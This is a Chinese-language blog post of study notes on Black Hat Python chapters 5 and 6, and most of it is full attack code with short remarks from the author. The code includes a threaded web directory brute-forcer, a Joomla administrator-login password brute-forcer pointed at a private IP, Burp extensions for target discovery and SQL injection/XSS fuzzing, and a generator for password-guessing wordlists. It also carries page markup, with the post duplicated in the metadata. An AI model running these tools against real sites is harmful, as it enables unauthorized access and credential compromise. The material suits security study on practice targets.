<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>blackhat python - web | 記事本</title>
<meta name=keywords content><meta name=description content="動機
這邊主要是處理http與web的html
還有網站結構"><meta name=author content="zhengcf"><link rel=canonical href=https://littlebees.github.io/2020/09/blackhat-python-web/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://littlebees.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://littlebees.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://littlebees.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://littlebees.github.io/apple-touch-icon.png><link rel=mask-icon href=https://littlebees.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="blackhat python - web"><meta property="og:description" content="動機
這邊主要是處理http與web的html
還有網站結構"><meta property="og:type" content="article"><meta property="og:url" content="https://littlebees.github.io/2020/09/blackhat-python-web/"><meta property="og:image" content="https://littlebees.github.io/images/papermod-cover.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-09-05T00:52:09+00:00"><meta property="article:modified_time" content="2020-09-05T00:52:09+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://littlebees.github.io/images/papermod-cover.png"><meta name=twitter:title content="blackhat python - web"><meta name=twitter:description content="動機
這邊主要是處理http與web的html
還有網站結構"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://littlebees.github.io/posts/"},{"@type":"ListItem","position":2,"name":"blackhat python - web","item":"https://littlebees.github.io/2020/09/blackhat-python-web/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"blackhat python - web","name":"blackhat python - web","description":"動機 這邊主要是處理http與web的html 還有網站結構\n","keywords":[],"articleBody":"動機 這邊主要是處理http與web的html 還有網站結構\nCH5 content_bruter.py\nimport queue import threading import urllib.error import urllib.parse import urllib.request threads = 50 target_url = \"http://testphp.vulnweb.com\" wordlist_file = \"all.txt\" # from SVNDigger resume = None user_agent = \"Mozilla/5.0 (X11; Linux x86_64; rv:19.0) \" \\ \"Gecko/20100101 \" \\ \"Firefox/19.0\" def build_wordlist(wordlst_file): # read in the word list fd = open(wordlst_file, \"r\") raw_words = [line.rstrip('\\n') for line in fd] fd.close() found_resume = False words = queue.Queue() for word in raw_words: if resume: if found_resume: words.put(word) else: if word == resume: found_resume = True print(\"Resuming wordlist from: %s\" % resume) else: words.put(word) return words def dir_bruter(extensions=None): while not word_queue.empty(): attempt = word_queue.get() attempt_list = [] # check if there is a file extension if not # it's a directory path we're bruting if \".\" not in attempt: attempt_list.append(\"/%s/\" % attempt) else: attempt_list.append(\"/%s\" % attempt) # if we want to bruteforce extensions if extensions: for extension in extensions: attempt_list.append(\"/%s%s\" % (attempt, extension)) # iterate over our list of attempts for brute in attempt_list: url = \"%s%s\" % (target_url, urllib.parse.quote(brute)) try: headers = {\"User-Agent\": user_agent} r = urllib.request.Request(url, headers=headers) response = urllib.request.urlopen(r) if len(response.read()): print(\"[%d] =\u003e %s\" % (response.code, url)) except urllib.error.HTTPError as e: if e.code != 404: print(\"!!! %d =\u003e %s\" % (e.code, url)) pass word_queue = build_wordlist(wordlist_file) file_extensions = [\".php\", \".bak\", \".orig\", \".inc\"] for i in range(threads): t = threading.Thread(target=dir_bruter, args=(file_extensions,)) t.start() 程式本身不難懂，不過那個resume就有點怪怪的 resume是如果有中斷的話，可以從這邊開始\nweb_app_mapper.py\nimport os import queue import threading import urllib.error import urllib.parse import urllib.request threads = 10 target = \"http://www.test.com\" directory = \"/Users/justin/Downloads/joomla-3.1.1\" filters = [\".jpg\", \".gif\", \"png\", \".css\"] os.chdir(directory) web_paths = queue.Queue() for r, d, f in os.walk(\".\"): for files in f: remote_path = \"%s/%s\" % (r, files) if remote_path.startswith(\".\"): remote_path = remote_path[1:] if os.path.splitext(files)[1] not in filters: web_paths.put(remote_path) def test_remote(): while not web_paths.empty(): path = web_paths.get() url = \"%s%s\" % (target, path) request = urllib.request.Request(url) try: response = urllib.request.urlopen(request) print(\"[%d] =\u003e %s\" % (response.code, path)) response.close() except urllib.error.HTTPError as error: print(\"Failed %s\" % error.code) pass for i in range(threads): print(\"Spawning thread: %d\" % i) t = threading.Thread(target=test_remote) t.start() 與上面的程式一樣是暴力法，但是list的來源一個是字典檔，這個是下載回來的檔案(ex:joomla)\n小總結: 生出有單字的queue -\u003e 讓thread發request去戳 -\u003e 看有沒有成功\njoomla_killer.py\nimport http.cookiejar import queue import threading import urllib.error import urllib.parse import urllib.request from abc import ABC from html.parser import HTMLParser # general settings user_thread = 10 username = \"admin\" wordlist_file = \"cain.txt\" resume = None # target specific settings target_url = \"http://192.168.112.131/administrator/index.php\" target_post = \"http://192.168.112.131/administrator/index.php\" username_field = \"username\" password_field = \"passwd\" success_check = \"Administration - Control Panel\" class BruteParser(HTMLParser, ABC): def __init__(self): HTMLParser.__init__(self) self.tag_results = {} def handle_starttag(self, tag, attrs): if tag == \"input\": tag_name = None for name, value in attrs: if name == \"name\": tag_name = value if tag_name: self.tag_results[tag_name] = value class Bruter(object): def __init__(self, user, words_q): self.username = user self.password_q = words_q self.found = False print(\"Finished setting up for: %s\" % user) def run_bruteforce(self): for i in range(user_thread): t = threading.Thread(target=self.web_bruter) t.start() def web_bruter(self): while not self.password_q.empty() and not self.found: brute = self.password_q.get().rstrip() jar = http.cookiejar.FileCookieJar(\"cookies\") opener = urllib.request.build_opener( urllib.request.HTTPCookieProcessor(jar)) response = opener.open(target_url) page = response.read() print(\"Trying: %s : %s (%d left)\" % ( self.username, brute, self.password_q.qsize())) # parse out the hidden fields parser = BruteParser() parser.feed(page) post_tags = parser.tag_results # add our username and password fields post_tags[username_field] = self.username post_tags[password_field] = brute login_data = urllib.parse.urlencode(post_tags) login_response = opener.open(target_post, login_data) #這樣就可以丟post!! login_result = login_response.read() if success_check in login_result: self.found = True print(\"[*] Bruteforce successful.\") print(\"[*] Username: %s\" % username) print(\"[*] Password: %s\" % brute) print(\"[*] Waiting for other threads to exit...\") def build_wordlist(wordlst_file): # read in the word list fd = open(wordlst_file, \"r\") raw_words = [line.rstrip('\\n') for line in fd] fd.close() found_resume = False word_queue = queue.Queue() for word in raw_words: word = word.rstrip() if resume is not None: if found_resume: word_queue.put(word) else: if word == resume: found_resume = True print(\"Resuming wordlist from: %s\" % resume) else: word_queue.put(word) return word_queue words = build_wordlist(wordlist_file) bruter_obj = Bruter(username, words) bruter_obj.run_bruteforce() 這裡是要送post的form，要替所有input都填上值，再用post打出去 不過那個opener用起來感覺不太直覺啊\nCH6 準備好jython的jar，之後就可以在burp加入自己的功能了\n但說老實的，我沒用過burp阿 之後應該用用burp，並記錄下來。\nbhp_bing.py\nimport base64 import json import re import socket import urllib.error import urllib.parse import urllib.request from burp import IBurpExtender from burp import IContextMenuFactory from java.net import URL from java.util import ArrayList from javax.swing import JMenuItem bing_api_key = \"YOURKEYHERE\" class BurpExtender(IBurpExtender, IContextMenuFactory): # implements def registerExtenderCallbacks(self, callbacks): self._callbacks = callbacks self._helpers = callbacks.getHelpers() self.context = None # we set up our extension callbacks.setExtensionName(\"BHP Bing\") callbacks.registerContextMenuFactory(self) return # implements def createMenuItems(self, context_menu): self.context = context_menu menu_list = ArrayList() menu_list.add(JMenuItem(\"Send to Bing\", actionPerformed=self.bing_menu)) return menu_list def bing_menu(self, event): # grab the details of what the user clicked http_traffic = self.context.getSelectedMessages() print(\"%d requests highlighted\" % len(http_traffic)) for traffic in http_traffic: http_service = traffic.getHttpService() host = http_service.getHost() print(\"User selected host: %s\" % host) self.bing_search(host) return def bing_search(self, host): # check if we have an IP or hostname is_ip = re.match(r'[0-9]+(?:\\.[0-9]+){3}', host) if is_ip: ip_address = host domain = False else: ip_address = socket.gethostbyname(host) domain = True bing_query_string = \"'ip:%s'\" % ip_address self.bing_query(bing_query_string) if domain: bing_query_string = \"'domain:%s'\" % host self.bing_query(bing_query_string) def bing_query(self, bing_query_string): print(\"Performing Bing search: %s\" % bing_query_string) # encode our query quoted_query = urllib.parse.quote(bing_query_string) http_request = \"GET https://api.datamarket.azure.com/Bing/Search/Web?$format=json\u0026$top=20\u0026Query=%s HTTP/1.1\\r\\n\" % quoted_query http_request += \"Host: api.datamarket.azure.com\\r\\n\" http_request += \"Connection: close\\r\\n\" http_request += \"Authorization: Basic %s\\r\\n\" % base64.b64encode( \":%s\" % bing_api_key) http_request += \"User-Agent: Blackhat Python\\r\\n\\r\\n\" json_body = self._callbacks.makeHttpRequest(\"api.datamarket.azure.com\", 443, True, http_request).tostring() json_body = json_body.split(\"\\r\\n\\r\\n\", 1)[1] try: r = json.loads(json_body) if len(r[\"d\"][\"results\"]): for site in r[\"d\"][\"results\"]: print(\"*\" * 100) print(site['Title']) print(site['Url']) print(site['Description']) print(\"*\" * 100) j_url = URL(site['Url']) if not self._callbacks.isInScope(j_url): print(\"Adding to Burp scope\") self._callbacks.includeInScope(j_url) except: print(\"No results from Bing\") pass return 從第一個網址開始，透過bing去找出其他相關的加入burp，來擴大搜尋範圍\nbhp_fuzzer.py\nfrom burp import IBurpExtender from burp import IIntruderPayloadGeneratorFactory from burp import IIntruderPayloadGenerator from java.util import List, ArrayList import random class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory): # implements def registerExtenderCallbacks(self, callbacks): self._callbacks = callbacks self._helpers = callbacks.getHelpers() callbacks.registerIntruderPayloadGeneratorFactory(self) return # implements @staticmethod def getGeneratorName(): return \"BHP Payload Generator\" # implements def createNewInstance(self, attack): return BHPFuzzer(self, attack) class BHPFuzzer(IIntruderPayloadGenerator): def __init__(self, extender, attack): self._extender = extender self._helpers = extender._helpers self._attack = attack print(\"BHP Fuzzer initialized\") self.max_payloads = 1000 self.num_payloads = 0 return def hasMorePayloads(self): print(\"hasMorePayloads called.\") if self.num_payloads == self.max_payloads: print(\"No more payloads.\") return False else: print(\"More payloads. Continuing.\") return True def getNextPayload(self, current_payload): # convert into a string payload = \"\".join(chr(x) for x in current_payload) # call our simple mutator to fuzz the POST payload = self.mutate_payload(payload) # increase the number of fuzzing attempts self.num_payloads += 1 return payload def reset(self): self.num_payloads = 0 return @staticmethod def mutate_payload(original_payload): # pick a simple mutator or even call an external script # like Radamsa does picker = random.randint(1, 3) # select a random offset in the payload to mutate offset = random.randint(0, len(original_payload) - 1) payload = original_payload[:offset] # random offset insert a SQL injection attempt if picker == 1: payload += \"'\" # jam an XSS attempt in if picker == 2: payload += \"\" # repeat a chunk of the original payload a random number if picker == 3: chunk_length = random.randint(len(payload[offset:]), len(payload) - 1) repeater = random.randint(1, 10) for i in range(repeater): payload += original_payload[offset:offset + chunk_length] # add the remaining bits of the payload payload += original_payload[offset:] return payload 就是iterator，會隨機修改request\nbhp_wordlist.py\n#!/usr/bin/env python # -*- coding: utf-8 -*- from burp import IBurpExtender from burp import IContextMenuFactory from javax.swing import JMenuItem from java.util import List, ArrayList from java.net import URL import re from datetime import datetime from html.parser import HTMLParser class TagStripper(HTMLParser): def __init__(self): HTMLParser.__init__(self) self.page_text = [] def handle_data(self, data): self.page_text.append(data) def handle_comment(self, data): self.handle_data(data) def strip(self, html): self.feed(html) return \" \".join(self.page_text) class BurpExtender(IBurpExtender, IContextMenuFactory): def registerExtenderCallbacks(self, callbacks): self._callbacks = callbacks self._helpers = callbacks.getHelpers() self.context = None self.hosts = set() # start with something we know is common self.wordlist = {\"password\"} # we set up our extension callbacks.setExtensionName(\"BHP Wordlist\") callbacks.registerContextMenuFactory(self) return def createMenuItems(self, context_menu): self.context = context_menu menu_list = ArrayList() menu_list.add(JMenuItem(\"Create Wordlist\", actionPerformed=self.wordlist_menu)) return menu_list def wordlist_menu(self, event): # grab the details of what the user clicked http_traffic = self.context.getSelectedMessages() for traffic in http_traffic: http_service = traffic.getHttpService() host = http_service.getHost() self.hosts.add(host) http_response = traffic.getResponse() if http_response: self.get_words(http_response) self.display_wordlist() return def get_words(self, http_response): headers, body = http_response.tostring().split('\\r\\n\\r\\n', 1) # skip non-text responses if headers.lower().find(\"content-type: text\") == -1: return tag_stripper = TagStripper() page_text = tag_stripper.strip(body) words = re.findall(r'[a-zA-Z]\\w{2,}', page_text) for word in words: # filter out long strings if len(word) \u003c= 12: self.wordlist.add(word.lower()) return @staticmethod def mangle(word): year = datetime.now().year suffixes = [\"\", \"1\", \"!\", year] mangled = [] for password in (word, word.capitalize()): for suffix in suffixes: mangled.append(\"%s%s\" % (password, suffix)) return mangled def display_wordlist(self): print(\"# BHP Wordlist for site(s) %s\" % \", \".join(self.hosts)) for word in sorted(self.wordlist): for password in self.mangle(word): print(password) return 就是從request的text中撈出word，塞到wordlist\n","wordCount":"1403","inLanguage":"en","datePublished":"2020-09-05T00:52:09Z","dateModified":"2020-09-05T00:52:09Z","author":{"@type":"Person","name":"zhengcf"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://littlebees.github.io/2020/09/blackhat-python-web/"},"publisher":{"@type":"Organization","name":"記事本","logo":{"@type":"ImageObject","url":"https://littlebees.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://littlebees.github.io/ accesskey=h title="記事本 (Alt + H)">記事本</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://littlebees.github.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://littlebees.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://littlebees.github.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://littlebees.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://littlebees.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">blackhat python - web</h1><div class=post-meta><span title='2020-09-05 00:52:09 +0000 UTC'>September 5, 2020</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;zhengcf</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#%e5%8b%95%e6%a9%9f aria-label=動機>動機</a></li><li><a href=#ch5 aria-label=CH5>CH5</a></li><li><a href=#ch6 aria-label=CH6>CH6</a></li></ul></div></details></div><div class=post-content><h2 id=動機>動機<a hidden class=anchor aria-hidden=true href=#動機>#</a></h2><p>這邊主要是處理http與web的html
還有網站結構</p><h2 id=ch5>CH5<a hidden class=anchor aria-hidden=true href=#ch5>#</a></h2><p>content_bruter.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>queue</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.error</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>threads</span> <span class=o>=</span> <span class=mi>50</span>
</span></span><span class=line><span class=cl><span class=n>target_url</span> <span class=o>=</span> <span class=s2>&#34;http://testphp.vulnweb.com&#34;</span>
</span></span><span class=line><span class=cl><span class=n>wordlist_file</span> <span class=o>=</span> <span class=s2>&#34;all.txt&#34;</span>  <span class=c1># from SVNDigger</span>
</span></span><span class=line><span class=cl><span class=n>resume</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl><span class=n>user_agent</span> <span class=o>=</span> <span class=s2>&#34;Mozilla/5.0 (X11; Linux x86_64; rv:19.0) &#34;</span> \
</span></span><span class=line><span class=cl>             <span class=s2>&#34;Gecko/20100101 &#34;</span> \
</span></span><span class=line><span class=cl>             <span class=s2>&#34;Firefox/19.0&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_wordlist</span><span class=p>(</span><span class=n>wordlst_file</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># read in the word list</span>
</span></span><span class=line><span class=cl>    <span class=n>fd</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>wordlst_file</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>raw_words</span> <span class=o>=</span> <span class=p>[</span><span class=n>line</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>fd</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>fd</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>found_resume</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=n>words</span> <span class=o>=</span> <span class=n>queue</span><span class=o>.</span><span class=n>Queue</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>word</span> <span class=ow>in</span> <span class=n>raw_words</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>resume</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>found_resume</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>words</span><span class=o>.</span><span class=n>put</span><span class=p>(</span><span class=n>word</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>word</span> <span class=o>==</span> <span class=n>resume</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>found_resume</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Resuming wordlist from: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>resume</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>words</span><span class=o>.</span><span class=n>put</span><span class=p>(</span><span class=n>word</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>words</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dir_bruter</span><span class=p>(</span><span class=n>extensions</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=ow>not</span> <span class=n>word_queue</span><span class=o>.</span><span class=n>empty</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>attempt</span> <span class=o>=</span> <span class=n>word_queue</span><span class=o>.</span><span class=n>get</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>attempt_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># check if there is a file extension if not</span>
</span></span><span class=line><span class=cl>        <span class=c1># it&#39;s a directory path we&#39;re bruting</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;.&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>attempt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>attempt_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;/</span><span class=si>%s</span><span class=s2>/&#34;</span> <span class=o>%</span> <span class=n>attempt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>attempt_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;/</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>attempt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># if we want to bruteforce extensions</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>extensions</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>extension</span> <span class=ow>in</span> <span class=n>extensions</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>attempt_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;/</span><span class=si>%s%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>attempt</span><span class=p>,</span> <span class=n>extension</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># iterate over our list of attempts        </span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>brute</span> <span class=ow>in</span> <span class=n>attempt_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%s%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>target_url</span><span class=p>,</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>brute</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=n>user_agent</span><span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>Request</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>response</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>read</span><span class=p>()):</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[</span><span class=si>%d</span><span class=s2>] =&gt; </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>code</span><span class=p>,</span> <span class=n>url</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=n>urllib</span><span class=o>.</span><span class=n>error</span><span class=o>.</span><span class=n>HTTPError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>e</span><span class=o>.</span><span class=n>code</span> <span class=o>!=</span> <span class=mi>404</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;!!! </span><span class=si>%d</span><span class=s2> =&gt; </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>e</span><span class=o>.</span><span class=n>code</span><span class=p>,</span> <span class=n>url</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>word_queue</span> <span class=o>=</span> <span class=n>build_wordlist</span><span class=p>(</span><span class=n>wordlist_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>file_extensions</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;.php&#34;</span><span class=p>,</span> <span class=s2>&#34;.bak&#34;</span><span class=p>,</span> <span class=s2>&#34;.orig&#34;</span><span class=p>,</span> <span class=s2>&#34;.inc&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>threads</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>dir_bruter</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>file_extensions</span><span class=p>,))</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span></code></pre></div><p>程式本身不難懂，不過那個<code>resume</code>就有點怪怪的
resume是如果有中斷的話，可以從這邊開始</p><hr><p>web_app_mapper.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>queue</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.error</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>threads</span> <span class=o>=</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s2>&#34;http://www.test.com&#34;</span>
</span></span><span class=line><span class=cl><span class=n>directory</span> <span class=o>=</span> <span class=s2>&#34;/Users/justin/Downloads/joomla-3.1.1&#34;</span>
</span></span><span class=line><span class=cl><span class=n>filters</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;.jpg&#34;</span><span class=p>,</span> <span class=s2>&#34;.gif&#34;</span><span class=p>,</span> <span class=s2>&#34;png&#34;</span><span class=p>,</span> <span class=s2>&#34;.css&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>directory</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>web_paths</span> <span class=o>=</span> <span class=n>queue</span><span class=o>.</span><span class=n>Queue</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>r</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=n>f</span> <span class=ow>in</span> <span class=n>os</span><span class=o>.</span><span class=n>walk</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>files</span> <span class=ow>in</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>remote_path</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%s</span><span class=s2>/</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>files</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>remote_path</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>):</span>
